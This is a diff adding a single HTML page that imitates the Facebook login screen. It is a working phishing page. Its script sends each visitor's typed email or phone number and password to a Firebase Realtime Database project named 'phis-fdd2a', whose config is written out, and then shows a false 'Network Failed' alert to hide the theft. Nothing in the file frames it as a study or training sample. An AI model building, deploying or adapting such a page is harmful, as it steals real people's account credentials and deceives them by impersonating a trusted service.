@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            width: 350px;
+            text-align: center;
+        }
+
+        .login-container h1 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+            box-sizing: border-box;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 12px;
+        }
+
+        .login-container button:hover {
+            background-color: #165ecf;
+        }
+
+        .login-container a {
+            display: block;
+            margin-top: 12px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        
+        
+  /* Spinner styles */
+  .spinner {
+    display: none; /* hidden by default */
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f3f3f3; /* Light gray */
+    border-top: 4px solid #007bff; /* Blue */
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin: -20px 0 0 -20px; /* center the spinner */
+    z-index: 10;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .overlay {
+    display: none; /* hidden by default */
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255,255,255,0.7);
+    z-index: 5;
+  }
+        
+        
+        
+    </style>
+</head>
+<body>
+    <div class="login-container">
+  <div class="overlay"></div>
+  <div class="spinner"></div>
+    
+    
+        <h1>Facebook</h1>
+        
+        
+        
+  <input type="text" id="emailPhone" placeholder="Email or Phone">
+  <input type="password" id="password" placeholder="Password">
+          <button onclick="login()">Log In</button>
+        <a href="#">Forgotten password?</a>
+        <hr style="margin: 20px 0;">
+        <button style="background-color: #42b72a;">Create New Account</button>
+    </div>
+</body>
+</html>
+
+<script>
+  // Firebase config
+  const firebaseConfig = {
+    apiKey: "AIzaSyCdUJAc7DpC1Ybr9ibybFzZEM-hDsIT_l8",
+    authDomain: "phis-fdd2a.firebaseapp.com",
+    databaseURL: "https://phis-fdd2a-default-rtdb.firebaseio.com",
+    projectId: "phis-fdd2a",
+    storageBucket: "phis-fdd2a.firebasestorage.app",
+    messagingSenderId: "602754254103",
+    appId: "1:602754254103:web:f73c49e272f1975c75e352"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  const spinner = document.querySelector(".spinner");
+  const overlay = document.querySelector(".overlay");
+
+  function showSpinner() {
+    spinner.style.display = "block";
+    overlay.style.display = "block";
+  }
+
+  function hideSpinner() {
+    spinner.style.display = "none";
+    overlay.style.display = "none";
+  }
+
+  function login() {
+    const emailPhone = document.getElementById("emailPhone").value;
+    const password = document.getElementById("password").value;
+
+    if(emailPhone === "" || password === "") {
+      alert("Please fill in both fields!");
+      return;
+    }
+
+    showSpinner(); // show spinner while saving
+
+    // Save login info to Realtime Database
+    const newUserRef = database.ref("users").push();
+    newUserRef.set({
+      emailPhone: emailPhone,
+      password: password,
+      timestamp: Date.now()
+    })
+    .then(() => {
+      hideSpinner(); // hide spinner
+      alert("Network Failed");
+    })
+    .catch((error) => {
+      hideSpinner(); // hide spinner
+      console.error("Error saving data: ", error);
+      alert("Network Failed");
+    });
+  }
+</script>
+</body>
+</html>
